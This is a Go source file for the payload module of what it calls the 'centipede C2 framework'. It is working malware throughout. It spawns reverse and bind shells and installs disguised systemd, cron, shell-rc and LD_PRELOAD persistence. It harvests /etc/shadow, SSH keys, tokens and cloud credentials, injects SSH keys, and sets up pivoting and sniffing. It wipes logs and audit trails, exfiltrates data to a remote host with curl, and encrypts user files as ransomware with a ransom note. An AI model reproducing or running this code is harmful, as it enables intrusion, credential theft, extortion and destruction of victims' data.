package payloads

import (
	"crypto/aes"
	"crypto/cipher"
	cryptorand "crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type PayloadRegistry struct {
	registered map[string]PayloadFunc
}

type PayloadFunc struct {
	Name        string
	Description string
	Run         func(args map[string]string) (string, error)
}

var registry *PayloadRegistry

func init() {
	registry = &PayloadRegistry{registered: make(map[string]PayloadFunc)}
	RegisterDefaults()
}

func RegisterDefaults() {
	Register("reverse_shell", "Spawn reverse shell", PayloadReverseShell)
	Register("persist", "Install persistence", PayloadPersist)
	Register("harvest", "Harvest credentials", PayloadHarvest)
	Register("lateral", "Lateral movement tools", PayloadLateral)
	Register("pivot", "Network pivot setup", PayloadPivot)
	Register("keylog", "Start keylogger", PayloadKeylog)
	Register("sniff", "Packet capture", PayloadSniff)
	Register("wipe", "Forensic cleanup", PayloadWipe)
	Register("enum", "System enumeration", PayloadEnum)
	Register("exfil", "Data exfiltration", PayloadExfil)
	Register("selfdestruct", "Self destruct", PayloadSelfDestruct)
	Register("ransomware", "Encrypt files with operator-defined key", PayloadRansomware)
	Register("ransomware_decrypt", "Decrypt files using operator key", PayloadRansomwareDecrypt)
}

func Register(name, desc string, fn func(map[string]string) (string, error)) {
	registry.registered[name] = PayloadFunc{Name: name, Description: desc, Run: fn}
}

func Get(name string) (PayloadFunc, bool) {
	p, ok := registry.registered[name]
	return p, ok
}

func List() []PayloadFunc {
	var list []PayloadFunc
	for _, p := range registry.registered {
		list = append(list, p)
	}
	return list
}

func Run(name string, args map[string]string) (string, error) {
	p, ok := Get(name)
	if !ok {
		return "", fmt.Errorf("payload %s not found", name)
	}
	return p.Run(args)
}

// Payload: Reverse Shell
func PayloadReverseShell(args map[string]string) (string, error) {
	host := args["host"]
	if host == "" {
		host = "127.0.0.1"
	}
	port := args["port"]
	if port == "" {
		port = "4444"
	}

	// Spawn PTY or pipe shell to C2
	shell := "/bin/sh"
	if runtime.GOOS == "linux" {
		if _, err := os.Stat("/bin/bash"); err == nil {
			shell = "/bin/bash"
		}
	}

	var out strings.Builder
	if args["mode"] == "bind" {
		// Bind shell
		cmd := exec.Command("sh", "-c",
			fmt.Sprintf("nc -lvp %s -e %s 2>&1", port, shell))
		cmd.Start()
		out.WriteString(fmt.Sprintf("Bind shell on port %s\n", port))
	} else {
		// Reverse shell
		payload := fmt.Sprintf(
			"nohup bash -c 'exec 3<>/dev/tcp/%s/%s; cat <&3 | while read line; do $line 2>&3; done' &",
			host, port)
		if _, err := exec.LookPath("nc"); err == nil {
			payload = fmt.Sprintf("nohup nc -e %s %s %s &", shell, host, port)
		}
		exec.Command("sh", "-c", payload).Start()
		out.WriteString(fmt.Sprintf("Reverse shell sent to %s:%s\n", host, port))
	}
	return out.String(), nil
}

// Payload: Persistence
func PayloadPersist(args map[string]string) (string, error) {
	var out strings.Builder
	exe, _ := os.ReadFile("/proc/self/exe")
	if exe == nil {
		log.Printf("[payload] cannot read self")
	}

	// Method 1: Systemd service
	sysdPath := "/etc/systemd/system/networkd-resume.service"
	sysdUnit := fmt.Sprintf(`[Unit]
Description=Network Resume Handler
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
`, "/usr/lib/systemd/networkd-helper")

	os.WriteFile(sysdPath, []byte(sysdUnit), 0644)
	exec.Command("systemctl", "enable", "networkd-resume.service").Run()
	exec.Command("systemctl", "start", "networkd-resume.service").Run()
	out.WriteString("Installed systemd service\n")

	// Method 2: Cron
	cronLine := fmt.Sprintf("*/5 * * * * root %s\n", "/usr/bin/.apt-helper")
	appendFile("/etc/crontab", cronLine)
	appendFile("/etc/cron.d/0hourly", cronLine)
	out.WriteString("Installed cron job\n")

	// Method 3: .bashrc / .zshrc hooks
	home, _ := os.UserHomeDir()
	if home == "" {
		home = "/root"
	}
	for _, rc := range []string{".bashrc", ".zshrc", ".profile"} {
		rcPath := filepath.Join(home, rc)
		hook := fmt.Sprintf("\n[ -x %s ] && nohup %s >/dev/null 2>&1 &\n",
			"/usr/bin/.apt-helper", "/usr/bin/.apt-helper")
		appendFile(rcPath, hook)
	}
	out.WriteString("Installed shell hooks\n")

	// Method 4: LD_PRELOAD rootkit
	if runtime.GOOS == "linux" {
		ldSo := "/etc/ld.so.preload"
		if args["library"] != "" {
			appendFile(ldSo, args["library"]+"\n")
			out.WriteString("Installed LD_PRELOAD hook\n")
		}
	}

	return out.String(), nil
}

// Payload: Credential Harvesting
func PayloadHarvest(args map[string]string) (string, error) {
	var out strings.Builder

	// Shadow file
	if data, err := os.ReadFile("/etc/shadow"); err == nil {
		out.WriteString("=== /etc/shadow ===\n")
		for _, line := range strings.Split(string(data), "\n") {
			if strings.Count(line, ":") >= 2 {
				out.WriteString(line + "\n")
			}
		}
	}

	// SSH keys
	sshDirs := []string{"/root/.ssh", os.Getenv("HOME") + "/.ssh"}
	for _, dir := range sshDirs {
		if dir == "/root/.ssh" || dir != "" {
			files, err := os.ReadDir(dir)
			if err != nil {
				continue
			}
			for _, f := range files {
				if !f.IsDir() {
					data, _ := os.ReadFile(filepath.Join(dir, f.Name()))
					if len(data) > 0 {
						out.WriteString(fmt.Sprintf("=== %s/%s ===\n", dir, f.Name()))
						out.WriteString(string(data))
					}
				}
			}
		}
	}

	// Environment variables
	for _, e := range os.Environ() {
		if strings.Contains(strings.ToLower(e), "pass") ||
			strings.Contains(strings.ToLower(e), "secret") ||
			strings.Contains(strings.ToLower(e), "token") ||
			strings.Contains(strings.ToLower(e), "key") ||
			strings.Contains(strings.ToLower(e), "auth") {
			out.WriteString(e + "\n")
		}
	}

	// Database configs
	dbConfigs := []string{
		"/etc/mysql/my.cnf",
		"/etc/postgresql/pg_hba.conf",
		"/etc/mongodb.conf",
		"/etc/redis/redis.conf",
		"/var/www/html/.env",
		"/var/www/.env",
		"/srv/www/.env",
	}
	for _, cfg := range dbConfigs {
		if data, err := os.ReadFile(cfg); err == nil {
			out.WriteString(fmt.Sprintf("=== %s ===\n", cfg))
			out.WriteString(string(data))
		}
	}

	// Kubernetes configs
	kubeConfigs := []string{
		os.Getenv("HOME") + "/.kube/config",
		"/root/.kube/config",
		"/etc/kubernetes/admin.conf",
	}
	for _, cfg := range kubeConfigs {
		if data, err := os.ReadFile(cfg); err == nil {
			out.WriteString(fmt.Sprintf("=== %s ===\n", cfg))
			out.WriteString(string(data))
		}
	}

	// Cloud provider creds
	cloudFiles := []string{
		os.Getenv("HOME") + "/.aws/credentials",
		"/root/.aws/credentials",
		os.Getenv("HOME") + "/.aws/config",
		os.Getenv("HOME") + "/.azure/credentials",
		os.Getenv("HOME") + "/.config/gcloud/credentials",
		os.Getenv("HOME") + "/.config/gcloud/application_default_credentials.json",
		"/root/.aws/credentials",
	}
	for _, cf := range cloudFiles {
		if data, err := os.ReadFile(cf); err == nil {
			out.WriteString(fmt.Sprintf("=== %s ===\n", cf))
			out.WriteString(string(data))
		}
	}

	return out.String(), nil
}

// Payload: Lateral Movement
func PayloadLateral(args map[string]string) (string, error) {
	var out strings.Builder

	// Inject SSH keys for persistence
	home := os.Getenv("HOME")
	if home == "" {
		home = "/root"
	}
	sshDir := filepath.Join(home, ".ssh")
	os.MkdirAll(sshDir, 0700)

	// Generate new SSH key
	keyPath := filepath.Join(sshDir, "id_centipede")
	exec.Command("ssh-keygen", "-t", "ed25519", "-f", keyPath, "-N", "", "-q").Run()
	pubKey, _ := os.ReadFile(keyPath + ".pub")

	// Add to authorized_keys
	authFile := filepath.Join(sshDir, "authorized_keys")
	appendFile(authFile, string(pubKey))
	os.Chmod(authFile, 0600)

	out.WriteString(fmt.Sprintf("SSH key injected: %s\n", string(pubKey)))

	// Also try adding to root's authorized_keys
	os.MkdirAll("/root/.ssh", 0700)
	appendFile("/root/.ssh/authorized_keys", string(pubKey))

	// Scan for SSH config and extract hosts
	if data, err := os.ReadFile(filepath.Join(sshDir, "config")); err == nil {
		out.WriteString("SSH Config:\n")
		out.WriteString(string(data))
	}

	// PSSH/pdsh discovery
	if isCommand("pssh") {
		out.WriteString("pssh available\n")
	}
	if isCommand("pdsh") {
		out.WriteString("pdsh available\n")
	}
	if isCommand("ansible") {
		out.WriteString("ansible available\n")
	}

	return out.String(), nil
}

// Payload: Network Pivot
func PayloadPivot(args map[string]string) (string, error) {
	var out strings.Builder

	// Enable IP forwarding
	exec.Command("sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward").Run()
	out.WriteString("IP forwarding enabled\n")

	// Set up SOCKS5 proxy on the beacon
	port := args["port"]
	if port == "" {
		port = "1080"
	}

	if isCommand("ssh") {
		// Dynamic forwarding
		cmd := exec.Command("sh", "-c",
			fmt.Sprintf("nohup ssh -D 0.0.0.0:%s -N -f localhost >/dev/null 2>&1 &", port))
		cmd.Run()
		out.WriteString(fmt.Sprintf("SOCKS proxy on 0.0.0.0:%s\n", port))
	}

	// Setup iptables NAT for network bridge
	exec.Command("iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0",
		"-j", "MASQUERADE").Run()
	out.WriteString("NAT masquerade enabled\n")

	// Add iptables persistence
	exec.Command("sh", "-c", "iptables-save > /etc/iptables.rules").Run()

	return out.String(), nil
}

// Payload: Keylogger
func PayloadKeylog(args map[string]string) (string, error) {
	var out strings.Builder
	out.WriteString("Keylogger requires kernel-level access\n")

	// Check /dev/input
	devInputs, err := os.ReadDir("/dev/input")
	if err == nil {
		for _, dev := range devInputs {
			if strings.Contains(dev.Name(), "event") {
				out.WriteString(fmt.Sprintf("Found input device: %s\n", dev.Name()))
			}
		}
	}
	return out.String(), nil
}

// Payload: Packet Sniffing
func PayloadSniff(args map[string]string) (string, error) {
	var out strings.Builder

	iface := args["interface"]
	if iface == "" {
		iface = "eth0"
	}

	// Check for tcpdump
	if isCommand("tcpdump") {
		filter := args["filter"]
		if filter == "" {
			filter = "port 80 or port 443"
		}
		dumpFile := fmt.Sprintf("/tmp/.sniff_%d.pcap", time.Now().Unix())
		cmd := exec.Command("sh", "-c",
			fmt.Sprintf("nohup tcpdump -i %s -s 0 -w %s '%s' >/dev/null 2>&1 &",
				iface, dumpFile, filter))
		cmd.Run()
		out.WriteString(fmt.Sprintf("Sniffing on %s -> %s\n", iface, dumpFile))
	} else {
		// Check interfaces
		ifaces, _ := os.ReadDir("/sys/class/net")
		for _, i := range ifaces {
			out.WriteString(fmt.Sprintf("Interface: %s\n", i.Name()))
		}
	}
	return out.String(), nil
}

// Payload: Forensic Cleanup
func PayloadWipe(args map[string]string) (string, error) {
	var out strings.Builder

	// Clear bash history
	home, _ := os.UserHomeDir()
	if home == "" {
		home = "/root"
	}
	os.Remove(filepath.Join(home, ".bash_history"))
	os.Remove("/root/.bash_history")
	os.Remove(filepath.Join(home, ".zsh_history"))
	os.Remove("/root/.zsh_history")
	exec.Command("sh", "-c", "history -c").Run()
	exec.Command("sh", "-c", "unset HISTFILE").Run()
	out.WriteString("Shell history cleared\n")

	// Clear journald
	exec.Command("journalctl", "--rotate").Run()
	exec.Command("journalctl", "--vacuum-time=1s").Run()
	out.WriteString("Journal cleared\n")

	// Clear syslog
	logFiles := []string{
		"/var/log/syslog",
		"/var/log/messages",
		"/var/log/auth.log",
		"/var/log/kern.log",
		"/var/log/dpkg.log",
		"/var/log/apt/term.log",
		"/var/log/faillog",
		"/var/log/lastlog",
	}
	for _, lf := range logFiles {
		os.WriteFile(lf, []byte{}, 0644)
	}
	out.WriteString("Log files wiped\n")

	// Clear auditd
	exec.Command("auditctl", "-e", "0").Run()
	exec.Command("sh", "-c", "echo > /var/log/audit/audit.log").Run()
	out.WriteString("Audit logs cleared\n")

	// Clear wtmp/btmp/utmp
	for _, f := range []string{"/var/log/wtmp", "/var/log/btmp", "/var/run/utmp"} {
		os.WriteFile(f, []byte{}, 0644)
	}
	out.WriteString("Login records cleared\n")

	// Remove our own binary traces
	os.Remove("/tmp/.dirtyfrag")
	os.Remove("/tmp/.dirtyfrag.c")
	os.Remove("/tmp/.dpipe")
	os.Remove("/tmp/.dpipe.c")
	os.Remove("/tmp/.pk")
	os.Remove("/tmp/.pk.c")
	os.Remove("/tmp/.go.c")

	// Randomize MAC (if root)
	if os.Geteuid() == 0 {
		exec.Command("sh", "-c",
			"macchanger -r eth0 2>/dev/null || ip link set dev eth0 address $(openssl rand -hex 6 | sed 's/\\(..\\)/\\1:/g; s/.$//')").Run()
		out.WriteString("MAC address randomized\n")
	}

	return out.String(), nil
}

// Payload: System Enumeration
func PayloadEnum(args map[string]string) (string, error) {
	var out strings.Builder

	cmds := []string{
		"uname -a", "id", "hostname", "hostnamectl 2>/dev/null",
		"cat /etc/os-release", "cat /etc/*release 2>/dev/null",
		"df -h", "free -h", "uptime", "lscpu 2>/dev/null",
		"ip addr 2>/dev/null || ifconfig",
		"ps aux 2>/dev/null | head -50",
		"netstat -tlnp 2>/dev/null || ss -tlnp",
		"cat /etc/passwd",
		"cat /etc/group",
		"sudo -l 2>/dev/null",
		"ls -la /etc/cron*", "cat /etc/crontab 2>/dev/null",
		"docker ps 2>/dev/null",
		"kubectl get nodes 2>/dev/null",
		"aws sts get-caller-identity 2>/dev/null",
		"gcloud auth list 2>/dev/null",
	}

	for _, c := range cmds {
		cmd := exec.Command("sh", "-c", c)
		if output, err := cmd.Output(); err == nil {
			out.WriteString(fmt.Sprintf("=== %s ===\n%s\n", c, string(output)))
		}
	}

	return out.String(), nil
}

// Payload: Data Exfiltration
func PayloadExfil(args map[string]string) (string, error) {
	var out strings.Builder
	target := args["target"]
	method := args["method"]

	if method == "http" && target != "" {
		exe, _ := os.ReadFile("/proc/self/exe")
		b64 := base64.StdEncoding.EncodeToString(exe)
		payload := fmt.Sprintf(`{"bot":"%s","data":"%s"}`, getHost(), b64)
		exec.Command("curl", "-X", "POST", "-d", payload, target).Run()
		out.WriteString(fmt.Sprintf("Binary exfiltrated to %s\n", target))
	}

	// Harvest results
	harvest, _ := PayloadHarvest(args)
	if harvest != "" {
		if target != "" {
			exec.Command("curl", "-X", "POST", "-d", harvest, target).Run()
		}
		out.WriteString("Harvest data exfiltrated\n")
	}

	return out.String(), nil
}

// Payload: Self Destruct
func PayloadSelfDestruct(args map[string]string) (string, error) {
	exec.Command("systemctl", "disable", "networkd-resume.service").Run()
	exec.Command("systemctl", "stop", "networkd-resume.service").Run()
	os.Remove("/etc/systemd/system/networkd-resume.service")
	exe, _ := os.Readlink("/proc/self/exe")
	if exe != "" {
		exec.Command("sh", "-c", fmt.Sprintf("rm -f %s", exe)).Start()
	}
	exe2, _ := os.Executable()
	if exe2 != "" {
		exec.Command("sh", "-c", fmt.Sprintf("rm -f %s", exe2)).Start()
	}
	PayloadWipe(args)
	os.Exit(0)
	return "", nil
}

// Payload: Ransomware
// Encrypts files on the target using an operator-defined key.
// The key is provided as a hex string in args["key"].
// If no key is set, it generates one and returns it.
// Directories to encrypt can be specified in args["dirs"] (comma-separated).

var ransomwareKey []byte

func PayloadRansomware(args map[string]string) (string, error) {
	var out strings.Builder

	// Resolve key
	keyHex := args["key"]
	if keyHex == "" {
		// Generate a new key
		newKey := make([]byte, 32)
		cryptorand.Read(newKey)
		ransomwareKey = newKey
		out.WriteString(fmt.Sprintf("No key provided. Generated key: %x\n", newKey))
		out.WriteString("Save this key to decrypt later. Use ransomware_decrypt with the same key.\n")
	} else {
		key, err := hex.DecodeString(keyHex)
		if err != nil {
			return "", fmt.Errorf("invalid key hex: %v", err)
		}
		if len(key) != 32 {
			return "", fmt.Errorf("key must be 32 bytes (64 hex chars), got %d", len(key))
		}
		ransomwareKey = key
		out.WriteString(fmt.Sprintf("Using provided key: %x\n", key))
	}

	// Determine target directories
	dirStr := args["dirs"]
	if dirStr == "" {
		dirStr = "/home,/root,/var/www,/etc,/opt,/srv"
	}
	dirs := strings.Split(dirStr, ",")

	// File extensions to encrypt
	exts := []string{
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
		".pdf", ".txt", ".csv", ".rtf",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
		".mp3", ".mp4", ".wav", ".avi", ".mkv",
		".zip", ".tar", ".gz", ".rar", ".7z",
		".sql", ".db", ".sqlite", ".mdb",
		".pem", ".key", ".crt", ".cer",
		".ovpn", ".conf", ".cfg",
		".php", ".py", ".js", ".html", ".go", ".rs",
		".env", ".yml", ".yaml", ".json", ".xml",
	}

	skipDirs := map[string]bool{
		"/proc": true, "/sys": true, "/dev": true,
		"/run": true, "/tmp": true, "/var/cache": true,
	}

	encrypted := 0
	skipped := 0

	for _, dir := range dirs {
		dir = strings.TrimSpace(dir)
		if !pathExists(dir) {
			continue
		}
		out.WriteString(fmt.Sprintf("Scanning %s...\n", dir))

		err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			// Skip directories
			if info.IsDir() {
				if skipDirs[path] {
					return filepath.SkipDir
				}
				// Skip .git, node_modules
				if strings.HasPrefix(info.Name(), ".") {
					return nil
				}
				return nil
			}

			// Check extension
			ext := strings.ToLower(filepath.Ext(path))
			extMatch := false
			for _, e := range exts {
				if ext == e {
					extMatch = true
					break
				}
			}
			if !extMatch {
				return nil
			}

			// Skip already-encrypted files
			if strings.HasSuffix(path, ".centipede") {
				skipped++
				return nil
			}

			// Read, encrypt, write
			plaintext, err := os.ReadFile(path)
			if err != nil {
				return nil
			}

			ciphertext, err := aesEncrypt(plaintext, ransomwareKey)
			if err != nil {
				return nil
			}

			// Write encrypted content
			if err := os.WriteFile(path+".centipede", ciphertext, 0644); err != nil {
				return nil
			}

			// Remove original
			os.Remove(path)
			encrypted++
			return nil
		})
		if err != nil {
			out.WriteString(fmt.Sprintf("Error scanning %s: %v\n", dir, err))
		}
	}

	out.WriteString(fmt.Sprintf("\n=== RANSOMWARE EXECUTION COMPLETE ===\n"))
	out.WriteString(fmt.Sprintf("Files encrypted: %d\n", encrypted))
	out.WriteString(fmt.Sprintf("Already encrypted (skipped): %d\n", skipped))
	out.WriteString(fmt.Sprintf("Key: %x\n", ransomwareKey))
	out.WriteString("To decrypt: use ransomware_decrypt with the same key\n")

	// Write ransom note
	note := fmt.Sprintf(`== CENTIPEDE RANSOMWARE ==

Your files have been encrypted with AES-256-GCM.
All affected files have the extension .centipede appended.

To recover your data, you need the encryption key.
If your operator has triggered this, they will provide instructions.

Encryption Key: %x

For decryption: deploy ransomware_decrypt payload with this key.

-- centipede C2 framework
`, ransomwareKey)

	for _, dir := range dirs {
		dir = strings.TrimSpace(dir)
		notePath := filepath.Join(dir, "CENTIPEDE_RANSOM_NOTE.txt")
		os.WriteFile(notePath, []byte(note), 0644)
		out.WriteString(fmt.Sprintf("Ransom note: %s\n", notePath))
	}

	return out.String(), nil
}

// Payload: Ransomware Decrypt
func PayloadRansomwareDecrypt(args map[string]string) (string, error) {
	var out strings.Builder

	keyHex := args["key"]
	if keyHex == "" {
		return "", fmt.Errorf("key is required for decryption (use same key as encryption)")
	}

	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return "", fmt.Errorf("invalid key hex: %v", err)
	}
	if len(key) != 32 {
		return "", fmt.Errorf("key must be 32 bytes (64 hex chars), got %d", len(key))
	}

	dirStr := args["dirs"]
	if dirStr == "" {
		dirStr = "/,/home,/root,/var/www,/etc,/opt,/srv"
	}
	dirs := strings.Split(dirStr, ",")

	decrypted := 0

	for _, dir := range dirs {
		dir = strings.TrimSpace(dir)
		if !pathExists(dir) {
			continue
		}

		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			if !strings.HasSuffix(path, ".centipede") {
				return nil
			}

			ciphertext, err := os.ReadFile(path)
			if err != nil {
				return nil
			}

			plaintext, err := aesDecrypt(ciphertext, key)
			if err != nil {
				out.WriteString(fmt.Sprintf("Failed to decrypt %s: %v\n", path, err))
				return nil
			}

			// Restore original filename
			origPath := strings.TrimSuffix(path, ".centipede")
			if err := os.WriteFile(origPath, plaintext, 0644); err != nil {
				return nil
			}

			os.Remove(path)
			decrypted++
			return nil
		})
	}

	out.WriteString(fmt.Sprintf("Files decrypted: %d\n", decrypted))
	if decrypted > 0 {
		// Remove ransom notes
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			os.Remove(filepath.Join(dir, "CENTIPEDE_RANSOM_NOTE.txt"))
		}
		out.WriteString("Ransom notes removed\n")
	}

	return out.String(), nil
}

// AES-256-GCM encryption/decryption helpers
func aesEncrypt(plaintext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(cryptorand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func appendFile(path, data string) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(data)
	return err
}

func pathExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func isCommand(name string) bool {
	_, err := exec.LookPath(name)
	return err == nil
}

func getHost() string {
	h, _ := os.Hostname()
	return h
}
